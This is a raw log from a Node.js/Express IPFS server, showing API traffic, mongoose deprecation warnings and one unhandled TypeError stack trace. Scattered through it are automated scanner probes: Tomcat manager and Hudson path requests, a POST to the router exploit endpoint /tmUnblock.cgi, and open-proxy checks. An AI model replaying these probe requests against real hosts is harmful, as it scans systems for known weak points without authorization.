App listening on port 8080
(node:31078) DeprecationWarning: `open()` is deprecated in mongoose >= 4.11.0, use `openUri()` instead, or set the `useMongoClient` option if using `connect()` or `createConnection()`. See http://mongoosejs.com/docs/4.x/docs/connections.html#use-mongo-client
[0mOPTIONS /api/ipfsusage/savefile [32m204 [0m2.487 ms - 0[0m
[0mPOST /api/ipfsusage/savefile [32m200 [0m46.923 ms - 345[0m
[0mGET /manager/html [33m404 [0m1.285 ms - 151[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158304140105&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.397 ms - 149[0m
[0mGET / [33m404 [0m0.365 ms - 139[0m
[0mGET / [33m404 [0m0.375 ms - 139[0m
App listening on port 8080
(node:10387) DeprecationWarning: `open()` is deprecated in mongoose >= 4.11.0, use `openUri()` instead, or set the `useMongoClient` option if using `connect()` or `createConnection()`. See http://mongoosejs.com/docs/4.x/docs/connections.html#use-mongo-client
[0mOPTIONS /api/auth/protected [32m204 [0m3.585 ms - 0[0m
[0mGET /api/auth/protected [33m401 [0m4.072 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.431 ms - 0[0m
[0mPOST /api/auth/login [33m401 [0m42.544 ms - -[0m
[0mOPTIONS /api/auth/register [32m204 [0m0.129 ms - 0[0m
(node:10387) DeprecationWarning: Mongoose: mpromise (mongoose's default promise library) is deprecated, plug in your own promise library instead: http://mongoosejs.com/docs/promises.html
[0mPOST /api/auth/register [32m201 [0m64.251 ms - 368[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.111 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m13.978 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.177 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m2.077 ms - 359[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.109 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.292 ms - 354[0m
App listening on port 8080
(node:10550) DeprecationWarning: `open()` is deprecated in mongoose >= 4.11.0, use `openUri()` instead, or set the `useMongoClient` option if using `connect()` or `createConnection()`. See http://mongoosejs.com/docs/4.x/docs/connections.html#use-mongo-client
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m2.096 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m3.756 ms - 366[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.160 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m26.516 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.107 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.652 ms - 366[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.172 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.347 ms - 366[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.109 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m37.694 ms - 368[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.097 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.421 ms - 376[0m
[0mGET /manager/html [33m404 [0m2.588 ms - 151[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.121 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.646 ms - 366[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.170 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.134 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.412 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m4.079 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.114 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m16.004 ms - 368[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.088 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.499 ms - 376[0m
[0mGET / [33m404 [0m0.356 ms - 139[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158316818073&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.376 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.385 ms - 151[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158317613879653PC265009540608080 [33m404 [0m0.154 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.523 ms - 151[0m
[0mGET / [33m404 [0m0.479 ms - 139[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158318378601&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.264 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.572 ms - 151[0m
[0mGET / [33m404 [0m0.228 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.261 ms - 151[0m
[0mGET / [33m404 [0m0.438 ms - 139[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158319053573114PC265009540608080 [33m404 [0m0.289 ms - 149[0m
[0mGET / [33m404 [0m0.464 ms - 139[0m
[0mGET / [33m404 [0m0.330 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.520 ms - 151[0m
[0mGET / [33m404 [0m0.243 ms - 139[0m
[0mGET /favicon.ico [33m404 [0m0.278 ms - 150[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158319930399&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.329 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.280 ms - 151[0m
[0mGET http://httpheader.net/ [33m404 [0m0.372 ms - 139[0m
[0mGET /version [33m404 [0m0.237 ms - 146[0m
[0mGET / [33m404 [0m0.230 ms - 139[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158320493853906PC265009540608080 [33m404 [0m0.246 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.565 ms - 151[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.128 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.099 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m3.159 ms - 366[0m
[0mGET /api/auth/protected [33m401 [0m13.320 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.106 ms - 0[0m
[0mGET /api/auth/protected [33m401 [0m0.898 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.096 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.471 ms - 366[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.121 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.284 ms - 366[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.185 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m32.574 ms - 368[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.117 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.296 ms - 376[0m
App listening on port 8080
(node:13812) DeprecationWarning: `open()` is deprecated in mongoose >= 4.11.0, use `openUri()` instead, or set the `useMongoClient` option if using `connect()` or `createConnection()`. See http://mongoosejs.com/docs/4.x/docs/connections.html#use-mongo-client
[0mOPTIONS /api/auth/protected [32m204 [0m1.689 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.355 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m3.124 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m28.632 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.136 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.068 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.994 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m3.749 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.276 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.659 ms - 366[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.124 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m2.916 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.133 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.382 ms - 366[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.211 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m3.394 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.115 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.094 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.594 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m3.214 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.093 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m52.261 ms - 412[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.138 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.364 ms - 376[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.084 ms - 0[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.122 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.695 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m4.588 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.097 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.090 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.468 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m3.712 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.202 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.170 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.402 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m3.322 ms - -[0m
[0mGET /hudson [33m404 [0m1.736 ms - 145[0m
[0mOPTIONS /api/auth/protected [32m204 [0m1.217 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m2.786 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.186 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.160 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.468 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m3.274 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.090 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m17.776 ms - 412[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.119 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.103 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.469 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m2.754 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.104 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m3.063 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.157 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.172 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m2.350 ms - -[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.291 ms - 366[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.146 ms - 0[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.150 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.357 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m3.890 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.149 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.141 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.550 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m3.135 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.110 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.114 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.369 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m2.199 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.133 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m21.335 ms - 412[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.135 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.450 ms - 376[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.090 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.097 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.273 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m6.695 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.158 ms - 0[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.124 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.373 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m2.545 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.133 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.084 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m4.018 ms - -[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.423 ms - 366[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.141 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m1.930 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.158 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.272 ms - 366[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.332 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.225 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.527 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m3.167 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.288 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.083 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.463 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m5.537 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.189 ms - 0[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.164 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.281 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m6.114 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.157 ms - 0[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.127 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.358 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m2.223 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.130 ms - 0[0m
[0mPOST /api/auth/login [33m401 [0m20.348 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.110 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m14.898 ms - 412[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.132 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.460 ms - 376[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.204 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m1.369 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m2.911 ms - -[0m
[0mGET / [33m404 [0m0.461 ms - 139[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.092 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.098 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.568 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m10.141 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.318 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.167 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.433 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m3.434 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.089 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m3.960 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.206 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m16.626 ms - 412[0m
[0mGET /logs [33m404 [0m0.220 ms - 143[0m
[0mGET /editConfig?returnUrl=/ [33m404 [0m0.218 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.303 ms - 151[0m
[0mGET http://httpheader.net/ [33m404 [0m0.395 ms - 139[0m
[0mGET / [33m404 [0m0.331 ms - 139[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158321476659&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.558 ms - 149[0m
[0mGET / [33m404 [0m0.279 ms - 139[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.179 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m3.394 ms - 354[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.182 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.344 ms - 354[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.169 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.173 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.591 ms - 366[0m
[0mGET /api/auth/protected [36m304 [0m10.644 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.244 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m2.933 ms - -[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.100 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.298 ms - 382[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.994 ms - 354[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m1.111 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.509 ms - 354[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.211 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.385 ms - 354[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.099 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.342 ms - 354[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.157 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m0.314 ms - 354[0m
App listening on port 8080
(node:14353) DeprecationWarning: `open()` is deprecated in mongoose >= 4.11.0, use `openUri()` instead, or set the `useMongoClient` option if using `connect()` or `createConnection()`. See http://mongoosejs.com/docs/4.x/docs/connections.html#use-mongo-client
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m2.194 ms - 0[0m
(node:14353) UnhandledPromiseRejectionWarning: TypeError: Cannot read property 'userid' of undefined
    at exports.getipfsconfig (/home/rameshbn/ipfsworks/ipfsnodeserver/app/controllers/ipfsnode.js:68:25)
    at Layer.handle [as handle_request] (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/layer.js:95:5)
    at /home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:335:12)
    at next (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:275:10)
    at Function.handle (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:174:3)
    at router (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:47:12)
    at Layer.handle [as handle_request] (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:317:13)
    at /home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:335:12)
    at next (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:275:10)
    at Function.handle (/home/rameshbn/ipfsworks/ipfsnodeserver/node_modules/express/lib/router/index.js:174:3)
(node:14353) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:14353) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
App listening on port 8080
(node:14376) DeprecationWarning: `open()` is deprecated in mongoose >= 4.11.0, use `openUri()` instead, or set the `useMongoClient` option if using `connect()` or `createConnection()`. See http://mongoosejs.com/docs/4.x/docs/connections.html#use-mongo-client
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m2.355 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m21.698 ms - 362[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.443 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.221 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m8.064 ms - 374[0m
[0mGET /api/auth/protected [36m304 [0m7.462 ms - -[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m2.866 ms - 362[0m
[0mOPTIONS /api/ipfsusage/savefile [32m204 [0m0.113 ms - 0[0m
[0mPOST /api/ipfsusage/savefile [32m200 [0m30.049 ms - 338[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.112 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m3.767 ms - 362[0m
[0mOPTIONS /api/ipfsusage/savefile [32m204 [0m0.127 ms - 0[0m
[0mPOST /api/ipfsusage/savefile [32m200 [0m11.188 ms - 338[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.153 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m3.192 ms - 362[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.175 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m2.694 ms - 362[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.186 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m2.990 ms - 362[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.173 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.084 ms - 0[0m
[0mGET /api/auth/protected [36m304 [0m2.928 ms - -[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m2.508 ms - 374[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.139 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m2.311 ms - 382[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158321934159293PC265009540608080 [33m404 [0m2.526 ms - 149[0m
[0mGET /manager/html [33m404 [0m1.904 ms - 151[0m
App listening on port 8080
(node:14987) DeprecationWarning: `open()` is deprecated in mongoose >= 4.11.0, use `openUri()` instead, or set the `useMongoClient` option if using `connect()` or `createConnection()`. See http://mongoosejs.com/docs/4.x/docs/connections.html#use-mongo-client
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m3.209 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [33m401 [0m7.957 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.172 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.096 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [33m401 [0m0.764 ms - -[0m
[0mGET /api/auth/protected [33m401 [0m1.394 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.113 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m76.103 ms - 412[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.188 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m5.158 ms - 382[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m4.250 ms - 362[0m
[0mOPTIONS /api/ipfsusage/savefile [32m204 [0m0.138 ms - 0[0m
[0mPOST /api/ipfsusage/savefile [32m200 [0m43.306 ms - 338[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.103 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m3.941 ms - 362[0m
[0mGET / [33m404 [0m38.515 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.351 ms - 151[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.097 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m28.962 ms - 362[0m
[0mGET / [33m404 [0m0.347 ms - 139[0m
[0mOPTIONS /api/ipfsusage/savefile [32m204 [0m0.138 ms - 0[0m
[0mPOST /api/ipfsusage/savefile [32m200 [0m25.643 ms - 332[0m
[0mOPTIONS /api/ipfsusage/savefile [32m204 [0m0.157 ms - 0[0m
[0mPOST /api/ipfsusage/savefile [32m200 [0m3.312 ms - 348[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.104 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.104 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m7.188 ms - 374[0m
[0mGET /api/auth/protected [36m304 [0m5.936 ms - -[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158323046943&a=PSCMN&i=2650095406&p=8080 [33m404 [0m1.263 ms - 149[0m
App listening on port 8080
(node:22624) DeprecationWarning: `open()` is deprecated in mongoose >= 4.11.0, use `openUri()` instead, or set the `useMongoClient` option if using `connect()` or `createConnection()`. See http://mongoosejs.com/docs/4.x/docs/connections.html#use-mongo-client
[0mOPTIONS /api/auth/login [32m204 [0m1.760 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m57.933 ms - 412[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.395 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m14.385 ms - 362[0m
[0mOPTIONS /api/ipfsusage/savefile [32m204 [0m0.148 ms - 0[0m
[0mPOST /api/ipfsusage/savefile [32m200 [0m12.884 ms - 314[0m
[0mGET / [33m404 [0m1.721 ms - 139[0m
[0mGET /hudson [33m404 [0m0.641 ms - 145[0m
[0mGET / [33m404 [0m0.256 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.248 ms - 151[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158356156797&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.295 ms - 149[0m
[0mGET / [33m404 [0m1.102 ms - 139[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158356492299892PC265009540608080 [33m404 [0m0.225 ms - 149[0m
[0mGET / [33m404 [0m0.271 ms - 139[0m
[0mGET / [33m404 [0m0.286 ms - 139[0m
[0mGET / [33m404 [0m0.288 ms - 139[0m
[0mGET / [33m404 [0m0.288 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.251 ms - 151[0m
[0mPOST /tmUnblock.cgi [33m404 [0m0.190 ms - 153[0m
[0mGET /manager/html [33m404 [0m0.231 ms - 151[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158357704297&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.167 ms - 149[0m
[0mGET / [33m404 [0m0.263 ms - 139[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158357932321970PC265009540608080 [33m404 [0m0.350 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.278 ms - 151[0m
[0mGET / [33m404 [0m0.304 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.260 ms - 151[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158359249725&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.213 ms - 149[0m
[0mGET / [33m404 [0m0.305 ms - 139[0m
[0mGET / [33m404 [0m0.431 ms - 139[0m
[0mGET / [33m404 [0m0.251 ms - 139[0m
